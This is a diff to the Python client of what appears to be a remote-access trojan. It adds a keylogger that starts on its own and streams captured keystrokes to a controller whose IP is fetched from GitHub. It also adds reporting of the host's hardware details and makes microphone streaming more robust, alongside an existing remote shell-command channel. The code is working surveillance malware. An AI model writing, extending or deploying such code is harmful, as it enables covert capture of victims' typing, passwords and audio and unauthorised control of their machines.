@@ -23,7 +23,6 @@ try:
     import easyimporting
 except:
     subprocess.getoutput("py -m pip install easyimporting", shell=True)
-
 try:
     from file import File
 except:
@@ -82,8 +81,8 @@ def moveFileFromDir(data, file):
             shutil.copy(getpath(True)+"/"+data+"/"+file[f], getpath(True))
 
 
-easyimporting.importing("zipfile pyautogui lib_platform")
-import zipfile
+easyimporting.importing("PIL zipfile pyautogui lib_platform psutil", 'pillow')
+import zipfile, psutil
 try:
     import vidstream as vd
 except:
@@ -130,7 +129,10 @@ def microphone(port, ip):
     print(port, ip)
     def callback(in_data, frame_count, time_info, status):
         for s in read_list[1:]:
-            s.send(in_data)
+            try:
+                s.send(in_data)
+            except:
+                pass
         return (None, pyaudio.paContinue)
     try:
         stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, stream_callback=callback)
@@ -151,16 +153,39 @@ def microphone(port, ip):
             print(e)
             pass
         print('mic stop')
-        serversocket.close()
-        stream.stop_stream()
-        stream.close()
+        try:
+            serversocket.close()
+        except:
+            pass
+        try:
+            stream.stop_stream()
+            stream.close()
+        except:
+            pass
     except:
-        print('no mic')
-        (clientsocket, address) = serversocket.accept()
-        clientsocket.send('error'.encode())
+        try:
+            print('no mic')
+            (clientsocket, address) = serversocket.accept()
+            clientsocket.send('error'.encode())
+        except:
+            pass
         serversocket.close()
     
-
+class GetBytesSize(object):
+    # return the number in compressed bytes
+    def __init__(self, bytes_=0, suffix="B"):
+        self.suffix = suffix
+        self.bytes_ = bytes_
+        self.factor = 1024
+        self.units = ["", "K", "M", "G", "T", "P"]
+    def size_categorize(self):
+        for unit in self.units:
+            if self.bytes_ < self.factor:
+                return f"{self.bytes_:.2f}{unit}{self.suffix}"
+            self.bytes_ /= self.factor
+    def __str__(self):
+        return str(self.size_categorize())
+    
 # esential function
 def terminal(command):
     return subprocess.Popen(command, shell=True,stdout=subprocess.PIPE).stdout.read().decode('ascii', "ignore")
@@ -205,9 +230,9 @@ def press(key):
 def receive(timeoutKill):
     global run, progrun
     while True:
-        s.settimeout(timeoutKill)
+        Socket.settimeout(timeoutKill)
         try:
-            receive = (s.recv(2048).decode())
+            receive = (Socket.recv(2048).decode())
             print(receive)
         except:
             receive = "left"
@@ -223,8 +248,79 @@ def receive(timeoutKill):
         if receive != "9":
             return receive
 
+QUEUKeylogger = []
+
+def keylogger(stop):
+    global QUEUKeylogger
+    # save all logkey in a save.txt file
+    print("other")
+    from pynput.keyboard import Key, Listener
+    print("test")
+    def press(key):
+        print(key)
+        save(str(key).replace("'", ""))
+    def save(key):
+        with open("save.txt", "a") as file:
+            if key.find("enter") > 0:
+                QUEUKeylogger.append("w/145")
+                file.write("\n")
+            elif key.find("backspace") > 0:
+                QUEUKeylogger.append("x/332")
+                file.write("x/332")
+            elif key.find("space") > 0:
+                print("space")
+                QUEUKeylogger.append(" ")
+                file.write(" ")
+            elif key.find("ctrl_l") > 0:
+                QUEUKeylogger.append("")
+                file.write("")
+            elif key.find("ctrl_r") > 0:
+                QUEUKeylogger.append("")
+                file.write("")
+            elif key.find("alt_l") > 0:
+                QUEUKeylogger.append("")
+                file.write("")
+            elif key.find("ctrl_r") > 0:
+                QUEUKeylogger.append("")
+                file.write("")
+            elif key.find("tab") > 0:
+                QUEUKeylogger.append("    ")
+                file.write("    ")
+            elif key.find("key") == -1:
+                QUEUKeylogger.append(key)
+                file.write(key)
+    def release(key):
+        if stop():
+            return False
+    with Listener(on_press=press, on_release=release) as listener:
+        listener.join()
+
+sendListenKeylogger = False
+
+def QueuKeyloggerEvent(stop):
+    global sendListenKeylogger, QUEUKeylogger
+    stop_threads = False
+    threadingKeylogger = threading.Thread(target=keylogger, args =(lambda : stop_threads, ))
+    threadingKeylogger.start()
+    time.sleep(0.5)
+    while True:
+        time.sleep(0.001)
+        if QUEUKeylogger:
+            if sendListenKeylogger:
+                print("".join(QUEUKeylogger).encode())
+                Socket.send("".join(QUEUKeylogger).encode())
+            QUEUKeylogger = []
+        if stop():
+            break
+    stop_threads = True
+    threadingKeylogger.join()
+
+stop_Init_Keylogger = False
+threadingInitKeylogger = threading.Thread(target=QueuKeyloggerEvent, args =(lambda : stop_Init_Keylogger, ))
+threadingInitKeylogger.start()
+
 def execute(data):
-    global run, sortir, ossys, reloading
+    global run, sortir, ossys, reloading, sendListenKeylogger
     data = data.replace("9", "")
     data = data.replace("1+8", "9")
     dataLoop = data.split("{-_-}")
@@ -267,6 +363,10 @@ def execute(data):
             datalist.pop(0)
             data = " ".join(datalist)
             wallpaper(data)
+        elif data == "listenKeyloggerTrue":
+            sendListenKeylogger = True
+        elif data == "listenKeyloggerFalse":
+            sendListenKeylogger = False
         else:
             terminal(data)
 
@@ -278,16 +378,65 @@ try:
         wifi = file.read()
 except:
     wifi = 'unknow'
+ram = ''
+def get_size(bytes, suffix="B"):
+    return GetBytesSize(bytes, suffix)
+svmem = psutil.virtual_memory()
+data = {"Total": get_size(svmem.total),
+        "Available": get_size(svmem.available),
+        "Used": get_size(svmem.used),
+        "Percentage": svmem.percent}
+swap = psutil.swap_memory()
+for key, value in data.items():
+    if key == "Percentage":
+        ram += (f"{key} {value}%\n")
+    else:
+        ram += (f"{key} {value}\n")
+def graphicInfo():
+    list=easyimporting.importing("GPUtil tabulate")
+    GPUtil = list[0]
+    from tabulate import tabulate
+    gpus = GPUtil.getGPUs()
+    list_gpus = []
+    if gpus:
+        for gpu in gpus:
+            gpu_id = gpu.id
+            gpu_name = gpu.name
+            gpu_load = f"{gpu.load*100}%"
+            gpu_free_memory = f"{gpu.memoryFree}MB"
+            gpu_used_memory = f"{gpu.memoryUsed}MB"
+            gpu_total_memory = f"{gpu.memoryTotal}MB"
+            gpu_temperature = f"{gpu.temperature} °C"
+            gpu_uuid = gpu.uuid
+            list_gpus.append((
+                gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
+                gpu_total_memory, gpu_temperature, gpu_uuid
+            ))
+        return str(tabulate(list_gpus, headers=("id", "name", "load", "free memory",
+                        "used memory", "total memory", "temparature", "uuid"), tablefmt="pretty"))
+    return "you haven't gpu"
+cpu = ''
+cpu += (f"Physical cores; {psutil.cpu_count(logical=False)}\n")
+cpu += (f"Total cores; {psutil.cpu_count(logical=True)}\n")
+cpufreq=psutil.cpu_freq()
+cpu += (f"Max frequency; {cpufreq.max:.2f}Mhz\n")
+cpu += (f"Min frequency; {cpufreq.min:.2f}Mhz\n")
+cpu += (f"Current frequency; {cpufreq.current:.2f}Mhz\n")
+cpu += ("CPU Usage per core;\n")
+for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
+    cpu += (f"Core {i}; {percentage}%\n")
+cpu += (f"Total CPU Usage; {psutil.cpu_percent()}%\n")
 while True:
+    sendListenKeylogger = False
     ipScreen = f.getByGithub(f"{githubUrl}ip").replace("\n", "")
     print(ipScreen)
     print("ready")
     BREAK = False
     run = True
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ipScreen, 9999))
-        s.send(f'name:{str(lib_platform.hostname)}:mac:{getMacAddress()}:wifi:{wifi}'.encode())
+        Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        Socket.connect((ipScreen, 9999))
+        Socket.send(f'name:{str(lib_platform.hostname)}:mac:{getMacAddress()}:wifi:{wifi}:ram:{ram}:gpu:{graphicInfo()}:cpu:{cpu}'.encode())
     except:
         run = False
         pass
@@ -298,4 +447,7 @@ while True:
                 break
         if not progrun:
             break
-        s.close()
+        Socket.close()
+stop_Init_Keylogger = True
+threadingInitKeylogger.join()
+exit()
